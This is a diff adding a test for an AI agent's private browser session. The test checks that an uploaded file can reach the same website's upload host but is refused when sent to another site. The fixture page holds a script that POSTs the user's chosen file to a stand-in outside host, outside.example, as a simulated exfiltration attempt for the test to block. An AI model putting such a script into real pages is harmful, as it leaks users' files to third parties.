@@ -146,3 +146,66 @@ test(
     }
   },
 )
+
+test(
+  'private uploads may send the chosen file to another address of the same website, and to no other website',
+  { timeout: 30000 },
+  async () => {
+    const root = await mkdtemp(path.join(tmpdir(), 'sky-upload-website-'))
+    const source = path.join(root, 'example.png')
+    await writeFile(source, 'synthetic example picture')
+    await mkdir(path.join(root, 'task'))
+    const uploads = await prepareBrowserUploads([source], 'https://atlas.example', path.join(root, 'task'))
+    let page!: Page
+    const received: string[] = []
+    const browser = await PrivateBrowserSession.launch({
+      filesDir: path.join(root, 'downloads'),
+      profileDir: path.join(root, 'profile'),
+      uploads,
+      headless: true,
+      broker: new SignInBroker({
+        sources: async () => [],
+        connect: async () => {
+          throw new Error('No credentials in this test')
+        },
+        approval: { allowLookup: async () => false, choose: async () => null },
+      }),
+      prepare: async (created) => {
+        page = created
+        // A site with its own upload host: the page hands the chosen file to it, then tries a stranger.
+        await page.context().route('**/*', async (route) => {
+          const request = route.request()
+          const url = new URL(request.url())
+          if (url.pathname === '/receive') {
+            const headers = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*' }
+            if (request.method() === 'POST') received.push(`${url.hostname}: ${request.postData() ?? ''}`)
+            await route.fulfill({ status: request.method() === 'OPTIONS' ? 204 : 200, headers, body: '' })
+            return
+          }
+          await route.fulfill({
+            contentType: 'text/html',
+            body: '<title>Atlas example picture</title><h1>Choose a picture</h1><input id="picture" type="file" hidden><button onclick="document.getElementById(\'picture\').click()">Upload new picture</button><script>document.getElementById("picture").onchange = async event => { const file = event.target.files[0]; const send = address => fetch(address, { method: "POST", body: file }).then(() => "sent", () => "refused"); document.querySelector("h1").textContent = "Same website: " + await send("https://uploads.atlas.example/receive") + ". Another website: " + await send("https://outside.example/receive"); }</script>',
+          })
+        })
+      },
+    })
+    try {
+      await browser.callTool('browser_navigate', { url: uploads.origin })
+      await page.getByRole('button', { name: 'Upload new picture' }).click()
+      await browser.callTool('browser_file_upload', { paths: [uploads.files[0]!.path] })
+      await page.getByRole('heading', { name: /Another website/ }).waitFor()
+      assert({
+        given: 'a page that sends the chosen file to its own upload host, then to another website',
+        should: 'let the bytes reach the same website’s host and keep them from the other website',
+        actual: { page: await page.getByRole('heading').textContent(), received },
+        expected: {
+          page: 'Same website: sent. Another website: refused',
+          received: ['uploads.atlas.example: synthetic example picture'],
+        },
+      })
+    } finally {
+      await browser.close()
+      await rm(root, { recursive: true, force: true })
+    }
+  },
+)
